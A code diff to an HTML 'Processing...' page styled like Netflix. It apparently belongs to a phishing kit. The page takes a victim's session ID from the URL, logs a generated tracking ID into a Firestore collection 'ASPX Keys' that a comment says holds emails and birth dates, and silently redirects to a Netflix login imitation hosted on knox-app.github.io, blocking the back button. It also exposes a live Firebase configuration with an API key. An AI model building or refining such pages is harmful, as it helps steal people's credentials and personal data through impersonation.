@@ -3,74 +3,52 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Processing Session...</title>
+    <title>Processing...</title>
     <style>
+        /* Simple CSS for a full-page loading screen */
         body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background-color: #f4f7f6;
+            margin: 0;
+            padding: 0;
             display: flex;
             justify-content: center;
             align-items: center;
             height: 100vh;
-            margin: 0;
+            background-color: #141414; /* Dark background similar to streaming sites */
+            color: #ffffff;
+            font-family: Arial, sans-serif;
+            flex-direction: column;
         }
-        .container {
-            background-color: white;
-            padding: 40px;
-            border-radius: 10px;
-            box-shadow: 0 4px 10px rgba(0,0,0,0.1);
-            text-align: center;
-            max-width: 400px;
-            width: 100%;
+        .spinner {
+            border: 4px solid rgba(255, 255, 255, 0.3);
+            border-top: 4px solid #e50914; /* Red accent */
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin-bottom: 15px;
         }
-        h2 {
-            color: #333;
-            margin-bottom: 10px;
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
         }
-        p {
-            color: #666;
-            margin-bottom: 25px;
+        #message {
             font-size: 14px;
-        }
-        button {
-            background-color: #4CAF50;
-            color: white;
-            border: none;
-            padding: 12px 24px;
-            font-size: 16px;
-            border-radius: 5px;
-            cursor: pointer;
-            transition: background-color 0.3s ease;
-            width: 100%;
-        }
-        button:hover {
-            background-color: #45a049;
-        }
-        button:disabled {
-            background-color: #cccccc;
-            cursor: not-allowed;
-        }
-        .error {
-            color: red;
-            font-weight: bold;
+            opacity: 0.8;
         }
     </style>
 </head>
 <body>
 
-    <div class="container">
-        <h2>Authentication Step</h2>
-        <p id="status-message">Verifying session and generating secure ID...</p>
-        <button id="next-btn" disabled>Next</button>
-    </div>
+    <div class="spinner"></div>
+    <div id="message">Securely routing...</div>
 
-    <!-- Firebase SDK configured as a module -->
+    <!-- Firebase App (the core Firebase SDK) -->
     <script type="module">
-        // Import the functions you need from the SDKs you need
-        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.11.1/firebase-app.js";
-        import { getFirestore, doc, setDoc } from "https://www.gstatic.com/firebasejs/10.11.1/firebase-firestore.js";
+        // Import Firebase modular SDKs
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
+        import { getFirestore, doc, setDoc } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";
 
-        // Your web app's Firebase configuration
+        // Your web app's Firebase configuration (Provided by you)
         const firebaseConfig = {
             apiKey: "AIzaSyDPm2za3Ho0Hd8Henuhq0KxAHyUQh-Hi-U",
             authDomain: "question-metabase.firebaseapp.com",
@@ -82,19 +60,11 @@
             measurementId: "G-6ZP1FPMKSJ"
         };
 
-        // Initialize Firebase and Firestore
+        // Initialize Firebase
         const app = initializeApp(firebaseConfig);
         const db = getFirestore(app);
 
-        // UI Elements
-        const statusMessage = document.getElementById('status-message');
-        const nextBtn = document.getElementById('next-btn');
-
-        // Variables
-        let lotusId = "";
-        let sessionId = "";
-
-        // Function to generate 15 digit alphanumeric code
+        // Function to generate a random 15-digit alphanumeric string
         function generateLotusId() {
             const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
             let result = '';
@@ -104,49 +74,46 @@
             return result;
         }
 
-        // Main execution function
-        async function processSession() {
-            // 1. Get session ID from URL (e.g., ?session=1591542856)
+        // Main asynchronous function to handle the logic
+        async function processAndRedirect() {
+            // 1. Extract session ID from URL parameters
             const urlParams = new URLSearchParams(window.location.search);
-            sessionId = urlParams.get('session');
+            const sessionId = urlParams.get('session');
 
+            // If no session ID is found, halt execution and show error
             if (!sessionId) {
-                statusMessage.innerHTML = "<span class='error'>Error: No session ID found in URL.</span>";
+                document.getElementById('message').innerText = "Error: Invalid or missing Session ID.";
+                document.querySelector('.spinner').style.display = 'none';
                 return;
             }
 
-            // 2. Generate Lotus ID
-            lotusId = generateLotusId();
+            // 2. Generate the Lotus ID
+            const lotusId = generateLotusId();
 
             try {
-                // 3. Save to Firestore under "ASPX Keys" -> [Session ID]
-                // We use { merge: true } so it doesn't overwrite existing data (like email, dob, etc.)
+                // 3. Save to Firestore
+                // Referencing the collection "ASPX Keys" and the specific document (sessionId)
                 const docRef = doc(db, "ASPX Keys", sessionId);
+                
+                // Using setDoc with { merge: true } adds the new field without overwriting existing data
                 await setDoc(docRef, {
                     lotus: lotusId
                 }, { merge: true });
 
-                // 4. Update UI to allow user to proceed
-                statusMessage.innerText = "ID Generated and saved successfully. Click Next to continue.";
-                nextBtn.disabled = false;
+                // 4. Automatically Redirect User
+                const redirectUrl = `https://knox-app.github.io/netflix/lgn/1?session=${sessionId}&continue=&env=safeopt&lotus=${lotusId}`;
+                window.location.replace(redirectUrl); // Use replace so they can't click "back" to this processing page
 
             } catch (error) {
-                console.error("Error writing document: ", error);
-                statusMessage.innerHTML = `<span class='error'>Database Error: ${error.message}</span>`;
+                console.error("Error writing to database:", error);
+                document.getElementById('message').innerText = "Database connection error. Please try again.";
+                document.querySelector('.spinner').style.display = 'none';
             }
         }
 
-        // Handle Next Button Click
-        nextBtn.addEventListener('click', () => {
-            if (lotusId) {
-                // Redirect to 8.html with the new lotus ID
-                window.location.href = `https://knox-app.github.io/netflix/lgn/1.html?session=${sessionId}&lotus=${lotusId}`;
-            }
-        });
+        // Execute the function as soon as the script loads
+        processAndRedirect();
 
-        // Run the process when the page loads
-        window.onload = processSession;
     </script>
-
 </body>
 </html>
